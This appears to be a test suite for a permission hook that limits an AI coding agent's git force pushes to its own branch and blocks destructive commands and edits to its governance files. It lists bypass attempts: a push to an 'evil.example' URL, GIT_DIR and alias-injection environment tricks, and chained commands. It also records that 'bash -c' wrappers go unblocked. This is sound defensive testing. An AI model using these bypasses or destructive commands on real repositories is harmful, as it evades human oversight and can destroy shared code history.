/**
 * Integration tests: own-branch force-with-lease enforcement in the real
 * PreToolUse hook, against real throwaway git repos (no network, no real home).
 *
 * Run with: node --test ai-sdlc-plugin/hooks/enforce-lease-push.test.mjs
 */
import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const hookScript = join(__dirname, 'enforce-blocked-actions.js');

const BLOCKED = `  constraints:
    blockedPaths:
      - '.github/workflows/**'
      - '.ai-sdlc/**'
    blockedActions:
      - 'gh pr merge*'
      - 'git merge*'
      - 'git push --force*'
      - 'git push -f*'
      - 'git reset --hard*'
      - 'git checkout -- .'
      - 'git restore .'
`;
const roleYaml = (governance) =>
  `apiVersion: ai-sdlc.io/v1alpha1\nkind: AgentRole\nspec:\n  role: coding-agent\n  goal: test\n${governance}${BLOCKED}`;

const LEASE = `  governance:\n    allowForcePush: leaseOnOwnBranch\n    protectedBranches:\n      - release/*\n`;

let base;
let gitEnv;

function git(cwd, ...args) {
  return execFileSync('git', args, { cwd, env: gitEnv, encoding: 'utf-8' }).trim();
}

/** Builds main repo (+ bare origin) with the given policy; returns paths. */
function makeRepo(name, policyYaml, worktreeYaml) {
  const root = join(base, name);
  const bare = join(base, `${name}-origin.git`);
  mkdirSync(root, { recursive: true });
  git(root, 'init', '-q', '-b', 'main');
  mkdirSync(join(root, '.ai-sdlc'), { recursive: true });
  writeFileSync(join(root, '.ai-sdlc', 'agent-role.yaml'), policyYaml);
  writeFileSync(join(root, 'f.txt'), 'x');
  git(root, 'add', '-A');
  git(
    root,
    '-c',
    'user.name=t',
    '-c',
    'user.email=t@example.invalid',
    'commit',
    '-q',
    '-m',
    'init',
  );
  git(base, 'init', '-q', '--bare', bare);
  git(root, 'remote', 'add', 'origin', bare);
  const wt = join(root, '.worktrees', 'task');
  git(root, 'worktree', 'add', '-q', '-b', 'feat/own', wt);
  if (worktreeYaml !== undefined) {
    writeFileSync(join(wt, '.ai-sdlc', 'agent-role.yaml'), worktreeYaml);
  }
  return { root: realpathSync(root), wt: realpathSync(wt) };
}

function invoke(payload, { cwd, projectDir, unsetProject = false, env: extraEnv = {} }) {
  const env = { ...gitEnv, ...extraEnv };
  if (!unsetProject) env.CLAUDE_PROJECT_DIR = projectDir;
  try {
    return execFileSync('node', [hookScript], {
      input: JSON.stringify({ ...payload, cwd }),
      cwd,
      env,
      encoding: 'utf-8',
      timeout: 10000,
    }).trim();
  } catch (err) {
    return err.stdout?.trim() || '';
  }
}
const run = (command, opts) => invoke({ tool_name: 'Bash', tool_input: { command } }, opts);
const runWrite = (file_path, opts) =>
  invoke({ tool_name: 'Write', tool_input: { file_path } }, opts);
const denied = (out) => {
  try {
    return JSON.parse(out).hookSpecificOutput?.permissionDecision === 'deny';
  } catch {
    return false;
  }
};

let leaseRepo;
let neverRepo;
let wtCopyRepo;
let inverseRepo;

before(() => {
  base = realpathSync(mkdtempSync(join(tmpdir(), 'lease-push-')));
  const cfg = join(base, 'gitconfig');
  writeFileSync(cfg, '');
  gitEnv = {
    PATH: process.env.PATH,
    HOME: base,
    GIT_CONFIG_GLOBAL: cfg,
    GIT_CONFIG_NOSYSTEM: '1',
    GIT_TERMINAL_PROMPT: '0',
  };
  leaseRepo = makeRepo('lease', roleYaml(LEASE));
  neverRepo = makeRepo('never', roleYaml(''));
  // Trusted (main checkout) policy = never; PR-tree copy in the worktree = lease.
  wtCopyRepo = makeRepo('wtcopy', roleYaml(''), roleYaml(LEASE));
  // Trusted policy = lease; worktree copy tries to turn it off -> still lease.
  inverseRepo = makeRepo('inverse', roleYaml(LEASE), roleYaml(''));
});

after(() => rmSync(base, { recursive: true, force: true }));

const OWN = 'feat/own';
const L = () => `git push --force-with-lease origin ${OWN}`;

describe('leaseOnOwnBranch - allowed', () => {
  it('allows lease push of the worktree own branch (project dir = main checkout)', () => {
    const out = run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.root });
    assert.ok(!denied(out), out);
  });

  it('allows when CLAUDE_PROJECT_DIR is the worktree itself (policy read from main checkout)', () => {
    const out = run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.wt });
    assert.ok(!denied(out), out);
  });

  it('allows when CLAUDE_PROJECT_DIR is unset', () => {
    const out = run(L(), { cwd: leaseRepo.wt, unsetProject: true });
    assert.ok(!denied(out), out);
  });

  it('allows HEAD:<own> form', () => {
    const out = run(`git push --force-with-lease origin HEAD:${OWN}`, {
      cwd: leaseRepo.wt,
      projectDir: leaseRepo.root,
    });
    assert.ok(!denied(out), out);
  });

  it('a worktree copy can only TIGHTEN: copy says never while trusted says lease -> blocked (fail closed)', () => {
    const out = run(L(), { cwd: inverseRepo.wt, projectDir: inverseRepo.wt });
    assert.ok(denied(out), out);
  });

  it('plain non-force push of own branch is unaffected', () => {
    const out = run(`git push origin ${OWN}`, { cwd: leaseRepo.wt, projectDir: leaseRepo.root });
    assert.ok(!denied(out), out);
  });
});

describe('leaseOnOwnBranch - blocked', () => {
  const cases = [
    ['lease to another branch', 'git push --force-with-lease origin other'],
    ['refspec own:other', `git push --force-with-lease origin ${OWN}:other`],
    ['HEAD:other', 'git push --force-with-lease origin HEAD:other'],
    ['HEAD:main', 'git push --force-with-lease origin HEAD:main'],
    ['lease to main', 'git push --force-with-lease origin main'],
    ['lease to master', 'git push --force-with-lease origin master'],
    ['refs/heads/main', 'git push --force-with-lease origin refs/heads/main'],
    ['delete :main', 'git push --force-with-lease origin :main'],
    ['--delete own', `git push --force-with-lease --delete origin ${OWN}`],
    ['--mirror', 'git push --force-with-lease --mirror origin'],
    ['plain --force own branch', `git push --force origin ${OWN}`],
    ['-f own branch', `git push -f origin ${OWN}`],
    ['--force after args (no blockedAction prefix match)', `git push origin ${OWN} --force`],
    ['+refspec', `git push origin +${OWN}`],
    ['--force-if-includes alone', `git push --force-if-includes origin ${OWN}`],
    ['no refspec', 'git push --force-with-lease origin'],
    ['raw URL remote', `git push --force-with-lease https://evil.example/x.git ${OWN}`],
    ['unconfigured remote', `git push --force-with-lease evil ${OWN}`],
    ['chained', `${L()} && echo done`],
    ['cd elsewhere', `cd /tmp && ${L()}`],
    ['git -C', `git -C /tmp push --force-with-lease origin ${OWN}`],
    ['GIT_DIR prefix', `GIT_DIR=/tmp/x ${L()}`],
    ['--no-verify', `git push --no-verify --force-with-lease origin ${OWN}`],
    ['abbreviated flag', `git push --force-w origin ${OWN}`],
  ];
  for (const [name, cmd] of cases) {
    it(`blocks ${name}`, () => {
      const out = run(cmd, { cwd: leaseRepo.wt, projectDir: leaseRepo.root });
      assert.ok(denied(out), `${cmd} -> ${out}`);
    });
  }

  it('blocks a lease push from the main checkout on main (own branch is protected)', () => {
    const out = run('git push --force-with-lease origin main', {
      cwd: leaseRepo.root,
      projectDir: leaseRepo.root,
    });
    assert.ok(denied(out), out);
  });

  it('blocks a lease push of a policy-protected own branch', () => {
    git(leaseRepo.wt, 'checkout', '-q', '-b', 'release/1.0');
    const out = run('git push --force-with-lease origin release/1.0', {
      cwd: leaseRepo.wt,
      projectDir: leaseRepo.root,
    });
    git(leaseRepo.wt, 'checkout', '-q', OWN);
    assert.ok(denied(out), out);
  });

  it('blocks on a detached HEAD', () => {
    git(leaseRepo.wt, 'checkout', '-q', '--detach');
    const out = run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.root });
    git(leaseRepo.wt, 'checkout', '-q', OWN);
    assert.ok(denied(out), out);
  });
});

describe('never / unset / malformed - behaves exactly as before', () => {
  it('blocks lease push under never (generic blockedActions pattern)', () => {
    assert.ok(denied(run(L(), { cwd: neverRepo.wt, projectDir: neverRepo.root })));
  });

  it('plain force push stays blocked under never', () => {
    assert.ok(
      denied(
        run(`git push --force origin ${OWN}`, { cwd: neverRepo.wt, projectDir: neverRepo.root }),
      ),
    );
  });

  it('adds no new enforcement when there is no agent-role.yaml (fail-closed, unchanged legacy path)', () => {
    const r = makeRepo('nopolicy', roleYaml(''));
    rmSync(join(r.root, '.ai-sdlc', 'agent-role.yaml'));
    const out = run(`git push origin ${OWN} --force`, { cwd: r.wt, projectDir: r.root });
    assert.ok(!denied(out), 'no policy file: hook behaves as it did before this change');
  });

  for (const v of ['yes', 'always', 'LEASEONOWNBRANCH', '1']) {
    it(`malformed allowForcePush=${v} stays blocked`, () => {
      const r = makeRepo(
        `bad-${v}`.replace(/\W/g, ''),
        roleYaml(`  governance:\n    allowForcePush: ${v}\n`),
      );
      assert.ok(denied(run(L(), { cwd: r.wt, projectDir: r.root })));
    });
  }

  it('boolean false stays blocked', () => {
    const f = makeRepo('boolfalse', roleYaml(`  governance:\n    allowForcePush: false\n`));
    assert.ok(denied(run(L(), { cwd: f.wt, projectDir: f.root })));
  });

  it('boolean true is read as leaseOnOwnBranch (own branch only)', () => {
    const t = makeRepo('booltrue', roleYaml(`  governance:\n    allowForcePush: true\n`));
    assert.ok(!denied(run(L(), { cwd: t.wt, projectDir: t.root })));
    assert.ok(
      denied(run('git push --force-with-lease origin other', { cwd: t.wt, projectDir: t.root })),
    );
  });
});

describe('policy comes from the trusted checkout, never the PR tree', () => {
  it('worktree copy setting leaseOnOwnBranch has NO effect (project dir = worktree)', () => {
    assert.ok(denied(run(L(), { cwd: wtCopyRepo.wt, projectDir: wtCopyRepo.wt })));
  });

  it('same with CLAUDE_PROJECT_DIR unset', () => {
    assert.ok(denied(run(L(), { cwd: wtCopyRepo.wt, unsetProject: true })));
  });

  it('same with CLAUDE_PROJECT_DIR = main checkout', () => {
    assert.ok(denied(run(L(), { cwd: wtCopyRepo.wt, projectDir: wtCopyRepo.root })));
  });
});

describe('fixed integrity rules stay blocked under leaseOnOwnBranch', () => {
  const ctx = () => ({ cwd: leaseRepo.wt, projectDir: leaseRepo.root });

  it('blocks Write/Edit under .ai-sdlc/** (agent-role, attestations, verdicts)', () => {
    for (const rel of [
      '.ai-sdlc/agent-role.yaml',
      '.ai-sdlc/attestations/abc.v6.dsse.json',
      '.ai-sdlc/verdicts/some-task.json',
    ]) {
      assert.ok(denied(runWrite(join(leaseRepo.wt, rel), ctx())), rel);
    }
  });

  it('blocks governance relaxation from the PR tree (editing the worktree agent-role.yaml)', () => {
    assert.ok(
      denied(
        runWrite(join(wtCopyRepo.wt, '.ai-sdlc', 'agent-role.yaml'), {
          cwd: wtCopyRepo.wt,
          projectDir: wtCopyRepo.root,
        }),
      ),
    );
  });

  for (const cmd of [
    'git reset --hard HEAD~1',
    'git checkout -- .',
    'git restore .',
    ['gh', 'pr', 'merge', '5', '--squash'].join(' '),
    'git stash pop',
    'git stash clear',
  ]) {
    it(`blocks ${cmd}`, () => {
      assert.ok(denied(run(cmd, ctx())), cmd);
    });
  }

  it('the lease allowance does not exempt other blockedActions (chained reset)', () => {
    assert.ok(denied(run(`${L()}; git reset --hard`, ctx())));
  });
});

// ── Round-2 additions ────────────────────────────────────────────────

/** Installs a logging `git` shim in front of PATH; optionally failing --git-common-dir. */
function makeGitShim(name) {
  const realGit = execFileSync('which', ['git'], { encoding: 'utf-8' }).trim();
  const dir = join(base, `shim-${name}`);
  mkdirSync(dir, { recursive: true });
  const log = join(dir, 'calls.log');
  writeFileSync(
    join(dir, 'git'),
    `#!/bin/sh
echo "$*" >> "${log}"
if [ -n "$GIT_SHIM_FAIL_COMMON" ]; then
  case "$*" in *--git-common-dir*) exit 1;; esac
fi
exec "${realGit}" "$@"
`,
  );
  chmodSync(join(dir, 'git'), 0o755);
  return { dir, log, env: { PATH: `${dir}:${process.env.PATH}` } };
}
const calls = (shim) => (existsSync(shim.log) ? readFileSync(shim.log, 'utf-8').trim() : '');

describe('protected-branch bypass via git short-name resolution (regression)', () => {
  let r;
  before(() => {
    r = makeRepo(
      'shortname',
      roleYaml(
        `  governance:\n    allowForcePush: leaseOnOwnBranch\n    protectedBranches:\n      - develop\n`,
      ),
    );
    git(r.root, 'push', '-q', 'origin', 'main:develop');
    git(r.wt, 'fetch', '-q', 'origin');
    git(r.wt, 'checkout', '-q', '-b', 'heads/develop', 'origin/develop');
  });

  it('REPRODUCTION: git really resolves HEAD:heads/develop to the remote refs/heads/develop', () => {
    git(
      r.wt,
      '-c',
      'user.name=t',
      '-c',
      'user.email=t@example.invalid',
      'commit',
      '-q',
      '--allow-empty',
      '-m',
      'diverge',
    );
    const before = git(r.wt, 'ls-remote', 'origin', 'refs/heads/develop');
    git(r.wt, 'push', '-q', '--force-with-lease', 'origin', 'HEAD:heads/develop');
    const after = git(r.wt, 'ls-remote', 'origin', 'refs/heads/develop');
    assert.notEqual(before, after, 'the unguarded push updated the remote develop branch');
  });

  for (const cmd of [
    'git push --force-with-lease origin HEAD:heads/develop',
    'git push --force-with-lease origin heads/develop:heads/develop',
    'git push --force-with-lease origin heads/develop',
    'git push --force-with-lease origin HEAD:refs/heads/develop',
  ]) {
    it(`blocks ${cmd}`, () => {
      assert.ok(denied(run(cmd, { cwd: r.wt, projectDir: r.root })), cmd);
    });
  }

  it('blocks ambiguously named own branches (heads/main, refs/heads/main, tags/x, remotes/origin/main)', () => {
    for (const name of ['heads/main', 'refs/heads/main', 'tags/x', 'remotes/origin/main']) {
      git(r.wt, 'checkout', '-q', '-B', name);
      for (const cmd of [
        `git push --force-with-lease origin HEAD:${name}`,
        `git push --force-with-lease origin ${name}`,
        'git push --force-with-lease origin HEAD:heads/main',
      ]) {
        assert.ok(denied(run(cmd, { cwd: r.wt, projectDir: r.root })), `${name}: ${cmd}`);
      }
    }
  });
});

describe('fail-closed paths and git-subprocess discipline', () => {
  it('non-git cwd under a lease policy: lease push is denied', () => {
    const nongit = realpathSync(mkdtempSync(join(tmpdir(), 'lease-nongit-')));
    try {
      assert.ok(denied(run(L(), { cwd: nongit, projectDir: leaseRepo.root })));
    } finally {
      rmSync(nongit, { recursive: true, force: true });
    }
  });

  it('cwd in a DIFFERENT repo than the project dir: denied', () => {
    const other = makeRepo('otherrepo', roleYaml(LEASE));
    assert.ok(denied(run(L(), { cwd: other.wt, projectDir: leaseRepo.root })));
  });

  it('trusted main-checkout policy unreadable while the project-dir copy says lease: denied', () => {
    const r = makeRepo('nomain', roleYaml(LEASE), roleYaml(LEASE));
    rmSync(join(r.root, '.ai-sdlc', 'agent-role.yaml'));
    assert.ok(denied(run(L(), { cwd: r.wt, projectDir: r.wt })));
  });

  it('project-dir copy unreadable (directory in its place): no lease, blockedActions behave as before', () => {
    const r = makeRepo('unreadable', roleYaml(LEASE));
    rmSync(join(r.root, '.ai-sdlc', 'agent-role.yaml'));
    mkdirSync(join(r.root, '.ai-sdlc', 'agent-role.yaml'));
    // No readable policy at all: nothing new is enforced or granted.
    assert.ok(!denied(run(`git push origin ${OWN} --force`, { cwd: r.wt, projectDir: r.root })));
  });

  it('git failing to report the common dir (old git): fail closed to never', () => {
    const shim = makeGitShim('nocommon');
    const out = run(L(), {
      cwd: leaseRepo.wt,
      projectDir: leaseRepo.root,
      env: { ...shim.env, GIT_SHIM_FAIL_COMMON: '1' },
    });
    assert.ok(denied(out), out);
  });

  it('`never` runs NO git subprocess at all (policy decided from file text)', () => {
    const shim = makeGitShim('never');
    const out = run(L(), { cwd: neverRepo.wt, projectDir: neverRepo.root, env: shim.env });
    assert.ok(denied(out), 'still blocked by blockedActions');
    assert.equal(calls(shim), '', 'no git calls');
  });

  it('lease mode does run git (sanity check on the shim)', () => {
    const shim = makeGitShim('lease');
    run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.root, env: shim.env });
    assert.match(calls(shim), /symbolic-ref -q HEAD/);
    assert.match(calls(shim), /--git-common-dir/);
  });

  it('policy is resolved from the project dir repo independent of the tool cwd (other worktree)', () => {
    git(
      leaseRepo.root,
      'worktree',
      'add',
      '-q',
      '-b',
      'feat/b',
      join(leaseRepo.root, '.worktrees', 'b'),
    );
    const wtB = realpathSync(join(leaseRepo.root, '.worktrees', 'b'));
    // project dir = worktree A (leaseRepo.wt), push runs from worktree B on its own branch.
    const ok = run('git push --force-with-lease origin feat/b', {
      cwd: wtB,
      projectDir: leaseRepo.wt,
    });
    assert.ok(!denied(ok), ok);
    // ...but B's own-branch rule still applies: pushing A's branch from B is blocked.
    assert.ok(denied(run(L(), { cwd: wtB, projectDir: leaseRepo.wt })));
    // project dir = A whose copy says lease while the main checkout says never: blocked.
    git(
      wtCopyRepo.root,
      'worktree',
      'add',
      '-q',
      '-b',
      'feat/b',
      join(wtCopyRepo.root, '.worktrees', 'b'),
    );
    const wcB = realpathSync(join(wtCopyRepo.root, '.worktrees', 'b'));
    assert.ok(
      denied(
        run('git push --force-with-lease origin feat/b', { cwd: wcB, projectDir: wtCopyRepo.wt }),
      ),
    );
  });
});

describe('shell wrappers and env tricks (documented; unchanged from before this feature)', () => {
  const ctx = () => ({ cwd: leaseRepo.wt, projectDir: leaseRepo.root });

  it('bash -c / sh -c payloads are not parsed by this hook or by the legacy prefix patterns', () => {
    assert.ok(!denied(run("bash -c 'git push --force-with-lease origin main'", ctx())));
    assert.ok(!denied(run("sh -c 'git push -f origin main'", ctx())));
  });

  it('xargs git push is seen and blocked', () => {
    assert.ok(denied(run('xargs git push --force-with-lease origin main', ctx())));
  });

  it('NBSP-separated lease push is blocked', () => {
    assert.ok(denied(run(`git push --force-with-lease origin\u00a0${OWN}`, ctx())));
  });

  it('env-prefixed GIT_CONFIG_COUNT alias injection is blocked', () => {
    assert.ok(
      denied(
        run(
          'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.zz GIT_CONFIG_VALUE_0=push git zz --force origin main',
          ctx(),
        ),
      ),
    );
  });
});

describe('adopter blockedActions that are not about force flags keep applying to an allowed lease push', () => {
  it('a `git push *develop*` pattern still blocks, while the force patterns are exempted', () => {
    const r = makeRepo(
      'adopterpattern',
      roleYaml(LEASE).replace("- 'git push -f*'", "- 'git push -f*'\n      - 'git push *develop*'"),
    );
    git(r.wt, 'checkout', '-q', '-b', 'feat/develop-x');
    assert.ok(
      denied(
        run('git push --force-with-lease origin feat/develop-x', { cwd: r.wt, projectDir: r.root }),
      ),
    );
    git(r.wt, 'checkout', '-q', 'feat/own');
    assert.ok(!denied(run(L(), { cwd: r.wt, projectDir: r.root })));
  });
});

describe('CI-skip floor does not depend on allowForcePush', () => {
  // The PreToolUse hook deliberately does NOT enforce CI-skip tokens; the
  // pre-push gate script does, and it never reads governance policy at all.
  // This pins that: the script blocks a token-carrying commit under both settings.
  const script = join(__dirname, '..', '..', 'scripts', 'check-skip-ci-marker.sh');
  // Built at runtime so no literal magic token appears in any committed file.
  const token = ['[', 'skip', ' ', 'ci', ']'].join('');
  const ZERO = '0'.repeat(40);

  function scan(repo, message) {
    git(
      repo.root,
      '-c',
      'user.name=t',
      '-c',
      'user.email=t@example.invalid',
      'commit',
      '-q',
      '--allow-empty',
      '-m',
      message,
    );
    const sha = git(repo.root, 'rev-parse', 'HEAD');
    return spawnSync('bash', [script], {
      cwd: repo.root,
      env: gitEnv,
      input: `refs/heads/x ${sha} refs/heads/x ${ZERO}\n`,
      encoding: 'utf-8',
    });
  }

  for (const [label, gov] of [
    ['never', ''],
    ['leaseOnOwnBranch', LEASE],
  ]) {
    it(`blocks a commit carrying a CI-skip token under ${label}`, () => {
      const r = makeRepo(`ciskip-${label}`, roleYaml(gov));
      const res = scan(r, `chore: x ${token}`);
      assert.equal(res.status, 1, res.stderr);
      assert.match(res.stderr, /CI-skip magic token/);
    });

    it(`passes a clean commit under ${label}`, () => {
      const r = makeRepo(`ciskipclean-${label}`, roleYaml(gov));
      assert.equal(scan(r, 'chore: x (skip ci marker)').status, 0);
    });
  }
});
